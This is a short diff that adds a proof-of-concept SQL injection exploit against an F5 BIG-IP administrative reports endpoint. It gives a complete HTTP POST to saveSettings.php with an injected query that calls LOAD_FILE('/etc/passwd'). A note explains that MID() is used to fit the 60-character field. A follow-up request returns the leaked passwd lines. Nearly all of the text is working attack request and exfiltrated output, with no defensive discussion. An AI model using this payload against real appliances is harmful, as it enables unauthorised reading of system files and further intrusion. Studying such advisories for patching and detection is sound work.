@@ -1,0 +1,20 @@
+POST /sam/admin/reports/php/saveSettings.php HTTP/1.1
+Host: bigip
+Cookie: BIGIPAuthCookie=*VALID_COOKIE*
+Content-Length: 119
+
+{
+    "id": 2,
+    "defaultQuery": "XX', ext1=(SELECT MID(LOAD_FILE('/etc/passwd'),0,60)) --
+x" }
+
+Note: target fields are only VARCHAR(60) thus MID() is used for extracting
+data.
+
+A request to /sam/admin/reports/php/getSettings.php returns the data:
+
+HTTP/1.1 200 OK
+...
+
+{success:true,totalCount:1,rows:[{"id":"2","user":"admin","defaultQuery":"XX","ext1":"root:x:0:0:root:\/root:\/bin\/bash\nbin:x:1:1:bin:\/bin:\/sbin\/nol","ext2":""}]}
+
